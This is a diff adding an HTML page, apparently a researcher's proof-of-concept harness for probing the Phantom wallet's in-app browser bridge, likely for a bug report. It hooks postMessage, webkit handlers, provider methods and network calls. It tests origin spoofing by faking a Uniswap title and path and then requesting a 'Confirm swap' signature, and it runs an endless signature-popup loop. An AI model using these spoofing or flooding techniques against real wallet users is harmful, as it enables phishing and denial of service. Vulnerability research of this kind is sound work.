@@ -1,0 +1,367 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Phantom Deep Intercept</title>
+<script src="https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;background:#0a0c14;color:#c8cdd8;padding:10px;font-size:11px;-webkit-text-size-adjust:100%}
+  h1{font-size:14px;font-family:-apple-system,sans-serif;margin-bottom:4px;color:#e6e8ee}
+  .sub{font-size:10px;color:#6a7;margin-bottom:10px}
+  button{background:#5b6cff;color:#fff;border:0;border-radius:6px;padding:6px 10px;font-size:11px;font-weight:600;margin:2px}
+  button.r{background:#a03050}
+  button.g{background:#167a48}
+  button.a{background:#1e2850}
+  .log{background:#0c0f1e;border:1px solid #171c32;border-radius:6px;padding:8px;margin:6px 0;max-height:300px;overflow:auto;white-space:pre-wrap;word-break:break-all;font-size:9px;-webkit-overflow-scrolling:touch}
+  .log.hi{border-color:#4ade80;box-shadow:0 0 0 1px #4ade80 inset}
+  .section{font-size:10px;font-weight:700;color:#ab6cff;margin:12px 0 4px;text-transform:uppercase;letter-spacing:.5px}
+  code{background:#161a2e;padding:1px 3px;border-radius:2px}
+</style>
+</head>
+<body>
+
+<h1>Phantom Deep Intercept</h1>
+<div class="sub">Intercept JS↔Native communication to find origin spoofing vectors</div>
+
+<div class="section">Step 1 — Hook ALL communication channels</div>
+<button onclick="hookAll()">Hook Everything</button>
+<button class="a" onclick="cl('hook')">clear</button>
+<div class="log" id="hook"></div>
+
+<div class="section">Step 2 — Trigger connect (watch intercepted traffic)</div>
+<button onclick="doConnect()">Connect Wallet</button>
+<button class="a" onclick="cl('traffic')">clear</button>
+<div class="log" id="traffic"></div>
+
+<div class="section">Step 3 — Trigger signMessage (watch request payload)</div>
+<button onclick="doSign()">Sign Message</button>
+<button class="a" onclick="cl('sign')">clear</button>
+<div class="log" id="sign"></div>
+
+<div class="section">Step 4 — Trigger signTransaction (watch full tx flow)</div>
+<button onclick="doTx()">Sign Transaction (1 lamport)</button>
+<button class="a" onclick="cl('tx')">clear</button>
+<div class="log" id="tx"></div>
+
+<div class="section">Step 5 — Test origin spoof: modify request before native receives it</div>
+<button class="g" onclick="doSpoofTest()">Spoof Origin Test</button>
+<button class="a" onclick="cl('spoof')">clear</button>
+<div class="log" id="spoof"></div>
+
+<div class="section">Step 6 — DOS-9 Refined (for report recording)</div>
+<button class="r" onclick="doDos9()">Start Popup Loop</button>
+<button onclick="STOP=true">STOP</button>
+<button class="a" onclick="cl('dos')">clear</button>
+<div class="log" id="dos"></div>
+
+<div class="section">Raw Message Log (ALL postMessage traffic)</div>
+<button class="a" onclick="cl('raw')">clear</button>
+<div class="log" id="raw"></div>
+
+<script>
+var solanaWeb3=window.solanaWeb3||{};
+var Connection=solanaWeb3.Connection;
+var Transaction=solanaWeb3.Transaction;
+var SystemProgram=solanaWeb3.SystemProgram;
+var PublicKey=solanaWeb3.PublicKey;
+
+var provider=(window.phantom&&window.phantom.solana)||window.solana||null;
+var pubkey=null;
+var STOP=false;
+var BURN="1nc1nerator11111111111111111111111111111111";
+var RPC="https://api.mainnet-beta.solana.com";
+
+function $(id){return document.getElementById(id)}
+function ts(){return new Date().toISOString().substr(11,12)}
+function log(id,s){var e=$(id);if(!e)return;e.textContent+="["+ts()+"] "+s+"\n";e.scrollTop=e.scrollHeight}
+function cl(id){if($(id))$(id).textContent=""}
+
+/* ============================================================
+ * STEP 1: Hook ALL communication channels
+ * Goal: Find how JS sends requests TO native and what fields
+ *       are included (especially origin/url/host)
+ * ============================================================ */
+function hookAll(){
+  log("hook","=== HOOKING ALL CHANNELS ===");
+
+  /* --- 1a: Intercept window.postMessage (outgoing) --- */
+  var origPost=window.postMessage.bind(window);
+  window.postMessage=function(msg,target){
+    var s=typeof msg==="string"?msg:JSON.stringify(msg);
+    log("traffic","[JS→window.postMessage] target="+target+" data="+s.slice(0,500));
+    log("raw","OUT postMessage: "+s.slice(0,500));
+    /* Check for origin field in outgoing message */
+    if(typeof msg==="object"&&msg!==null){
+      checkForOriginField(msg,"postMessage outgoing");
+    }
+    return origPost(msg,target);
+  };
+  log("hook","window.postMessage hooked");
+
+  /* --- 1b: Intercept window.addEventListener (incoming) --- */
+  window.addEventListener("message",function(e){
+    var s=typeof e.data==="string"?e.data:JSON.stringify(e.data);
+    log("traffic","[Native→JS postMessage] origin="+e.origin+" source="+(e.source===window?"self":"other")+" data="+s.slice(0,500));
+    log("raw","IN postMessage origin="+e.origin+": "+s.slice(0,500));
+    if(typeof e.data==="object"&&e.data!==null){
+      checkForOriginField(e.data,"postMessage incoming");
+    }
+  },true); /* useCapture to see before Phantom's handler */
+  log("hook","postMessage listener installed (capture phase)");
+
+  /* --- 1c: Hook webkit.messageHandlers if exists --- */
+  if(window.webkit&&window.webkit.messageHandlers){
+    var handlers=window.webkit.messageHandlers;
+    var keys=[];
+    /* Try to enumerate all handler names via Proxy */
+    try{
+      var proto=Object.getPrototypeOf(handlers);
+      if(proto) keys=Object.getOwnPropertyNames(proto);
+    }catch(e){}
+    /* Also try common names */
+    var tryNames=["phantom","solana","ethereum","bridge","native","controller",
+                  "callback","request","response","app","wallet","rpc","event",
+                  "log","navigation","share","interop","ReactNativeWebView",
+                  "PhantomIOS","phantomIOS","__phantom__"];
+    tryNames.forEach(function(n){
+      try{
+        if(handlers[n]&&handlers[n].postMessage){
+          log("hook","FOUND webkit handler: "+n);
+          var orig=handlers[n].postMessage.bind(handlers[n]);
+          handlers[n].postMessage=function(msg){
+            var s=typeof msg==="string"?msg:JSON.stringify(msg);
+            log("traffic","[JS→webkit.messageHandlers."+n+"] "+s.slice(0,500));
+            log("raw","OUT webkit."+n+": "+s.slice(0,500));
+            if(typeof msg==="object") checkForOriginField(msg,"webkit."+n);
+            return orig(msg);
+          };
+          log("hook","webkit.messageHandlers."+n+".postMessage hooked");
+          keys.push(n);
+        }
+      }catch(e){}
+    });
+    if(keys.length===0) log("hook","no webkit handlers found");
+  }else{
+    log("hook","no webkit.messageHandlers");
+  }
+
+  /* --- 1d: Hook provider internal methods --- */
+  if(provider){
+    /* Hook all provider methods to log calls */
+    var methods=["connect","disconnect","signTransaction","signAllTransactions",
+                 "signAndSendTransaction","signAndSendAllTransactions",
+                 "signMessage","signIn","handleNotification","request"];
+    methods.forEach(function(m){
+      if(typeof provider[m]==="function"){
+        var orig=provider[m].bind(provider);
+        provider[m]=function(){
+          var args=Array.from(arguments);
+          var argsStr;
+          try{argsStr=JSON.stringify(args,function(k,v){
+            if(v&&v.constructor&&v.constructor.name==="Uint8Array") return "[Uint8Array:"+v.length+"]";
+            if(v&&v.constructor&&v.constructor.name==="Buffer") return "[Buffer:"+v.length+"]";
+            if(v&&typeof v==="object"&&v.toBase58) return v.toBase58();
+            return v;
+          }).slice(0,400)}catch(e){argsStr="[unserializable]"}
+          log("traffic","[JS→provider."+m+"] args="+argsStr);
+          log("raw","CALL provider."+m+"("+argsStr+")");
+          return orig.apply(provider,arguments);
+        };
+      }
+    });
+    log("hook","all provider methods hooked ("+methods.length+")");
+
+    /* Hook provider._events to see event registration */
+    if(provider._events){
+      log("hook","provider events: "+JSON.stringify(Object.keys(provider._events)));
+    }
+
+    /* Dump provider enumerable properties */
+    log("hook","--- provider full dump ---");
+    for(var k in provider){
+      var type=typeof provider[k];
+      if(type==="function") continue;
+      try{
+        var val=JSON.stringify(provider[k]).slice(0,100);
+        log("hook","  "+k+" ("+type+") = "+val);
+      }catch(e){
+        log("hook","  "+k+" ("+type+") = [unreadable]");
+      }
+    }
+  }else{
+    log("hook","NO PROVIDER — open in Phantom dApp browser");
+  }
+
+  /* --- 1e: Hook XMLHttpRequest to catch RPC calls --- */
+  var origOpen=XMLHttpRequest.prototype.open;
+  var origSend=XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.open=function(method,url){
+    this._hookUrl=url;
+    return origOpen.apply(this,arguments);
+  };
+  XMLHttpRequest.prototype.send=function(body){
+    if(this._hookUrl&&/solana|phantom|helius|alchemy/i.test(this._hookUrl)){
+      log("raw","XHR "+this._hookUrl+" body="+String(body).slice(0,300));
+    }
+    return origSend.apply(this,arguments);
+  };
+  log("hook","XMLHttpRequest hooked");
+
+  /* --- 1f: Hook fetch --- */
+  var origFetch=window.fetch;
+  window.fetch=function(url,opts){
+    var u=typeof url==="string"?url:(url.url||"");
+    if(/solana|phantom|helius|alchemy/i.test(u)){
+      log("raw","FETCH "+u+" body="+(opts&&opts.body?String(opts.body).slice(0,300):"none"));
+    }
+    return origFetch.apply(this,arguments);
+  };
+  log("hook","fetch hooked");
+
+  log("hook","=== ALL HOOKS INSTALLED ===");
+  log("hook","Now trigger connect/sign and watch 'traffic' + 'raw' logs");
+  $("hook").classList.add("hi");
+}
+
+/* Check any object for origin-related fields */
+function checkForOriginField(obj,label){
+  var keys=["origin","url","href","host","hostname","domain","site",
+            "source","sender","from","referer","referrer","page","dapp",
+            "app_url","appUrl","siteUrl","siteOrigin","requestOrigin"];
+  keys.forEach(function(k){
+    if(obj[k]!==undefined){
+      log("spoof","FOUND '"+k+"' in "+label+": "+JSON.stringify(obj[k]).slice(0,200));
+      $("spoof").classList.add("hi");
+    }
+  });
+  /* recursive check one level deep */
+  if(typeof obj==="object"){
+    for(var prop in obj){
+      if(typeof obj[prop]==="object"&&obj[prop]!==null){
+        keys.forEach(function(k){
+          if(obj[prop][k]!==undefined){
+            log("spoof","FOUND '"+prop+"."+k+"' in "+label+": "+JSON.stringify(obj[prop][k]).slice(0,200));
+            $("spoof").classList.add("hi");
+          }
+        });
+      }
+    }
+  }
+}
+
+/* ============================================================
+ * STEP 2-4: Trigger wallet actions
+ * ============================================================ */
+async function doConnect(){
+  if(!provider){log("traffic","no provider");return}
+  log("traffic","--- triggering connect ---");
+  try{
+    var r=await provider.connect();
+    pubkey=r.publicKey;
+    log("traffic","connected: "+pubkey.toString());
+  }catch(e){log("traffic","rejected: "+e.message)}
+}
+
+async function doSign(){
+  if(!provider){log("sign","no provider");return}
+  if(!pubkey) await doConnect();
+  log("sign","--- triggering signMessage ---");
+  try{
+    var msg=new TextEncoder().encode("Test message for origin analysis - "+Date.now());
+    log("sign","message: "+new TextDecoder().decode(msg));
+    log("sign",">>> WATCH 'traffic' LOG FOR REQUEST PAYLOAD <<<");
+    log("sign",">>> SCREENSHOT THE APPROVAL POPUP — CHECK ORIGIN <<<");
+    var sig=await provider.signMessage(msg,"utf8");
+    log("sign","signed! signature="+JSON.stringify(sig).slice(0,100));
+  }catch(e){log("sign","rejected: "+e.message)}
+}
+
+async function doTx(){
+  if(!provider){log("tx","no provider");return}
+  if(!pubkey) await doConnect();
+  log("tx","--- triggering signTransaction ---");
+  try{
+    var conn=new Connection(RPC);
+    var bh=await conn.getLatestBlockhash();
+    var tx=new Transaction();
+    tx.add(SystemProgram.transfer({
+      fromPubkey:pubkey,
+      toPubkey:new PublicKey(BURN),
+      lamports:1
+    }));
+    tx.recentBlockhash=bh.blockhash;
+    tx.feePayer=pubkey;
+    log("tx","tx built. 1 lamport to burn address.");
+    log("tx",">>> WATCH 'traffic' LOG FOR FULL REQUEST <<<");
+    log("tx",">>> SCREENSHOT APPROVAL POPUP — CHECK ORIGIN + SIMULATION <<<");
+    var signed=await provider.signTransaction(tx);
+    log("tx","signed!");
+  }catch(e){log("tx","rejected: "+e.message)}
+}
+
+/* ============================================================
+ * STEP 5: Origin spoof test
+ * If we find origin in the payload, modify it and re-send
+ * ============================================================ */
+async function doSpoofTest(){
+  if(!provider){log("spoof","no provider");return}
+  if(!pubkey) await doConnect();
+  log("spoof","=== ORIGIN SPOOF TEST ===");
+
+  /* Test A: modify document.title before sign */
+  document.title="Uniswap | Swap";
+  log("spoof","title changed to: "+document.title);
+
+  /* Test B: pushState to /app.uniswap.org/swap */
+  try{
+    history.pushState({},"","/app.uniswap.org/swap?inputCurrency=SOL");
+    log("spoof","pushState to: "+location.href);
+  }catch(e){log("spoof","pushState err: "+e.message)}
+
+  /* Test C: sign message — check what origin popup shows */
+  log("spoof","triggering signMessage after URL change...");
+  log("spoof",">>> SCREENSHOT THE POPUP — DOES IT SHOW /app.uniswap.org? <<<");
+  try{
+    var msg=new TextEncoder().encode("Confirm swap: 1 SOL → 150.23 USDC");
+    var sig=await provider.signMessage(msg,"utf8");
+    log("spoof","signed after spoof");
+  }catch(e){log("spoof","rejected: "+e.message)}
+
+  /* Test D: check if origin field appeared in traffic */
+  log("spoof","check 'traffic' log — if origin field was found, it can be modified");
+  log("spoof","check approval popup screenshot — what URL/origin is shown?");
+}
+
+/* ============================================================
+ * STEP 6: DOS-9 refined for recording
+ * ============================================================ */
+async function doDos9(){
+  if(!provider){log("dos","no provider");return}
+  if(!pubkey) await doConnect();
+
+  STOP=false;
+  var count=0;
+  log("dos","=== INFINITE POPUP LOOP (tap STOP to end) ===");
+  log("dos","recording evidence: each reject triggers new popup");
+
+  async function loop(){
+    if(STOP){log("dos","stopped at popup #"+count);return}
+    count++;
+    var ts=new Date().toISOString().substr(11,12);
+    log("dos","["+ts+"] popup #"+count);
+    try{
+      var msg=new TextEncoder().encode("Approve action #"+count);
+      await provider.signMessage(msg,"utf8");
+      log("dos","signed #"+count+" (unexpected)");
+    }catch(e){
+      /* rejected — immediately re-prompt */
+    }
+    if(!STOP) setTimeout(loop,30);
+  }
+  loop();
+}
+</script>
+</body>
+</html>
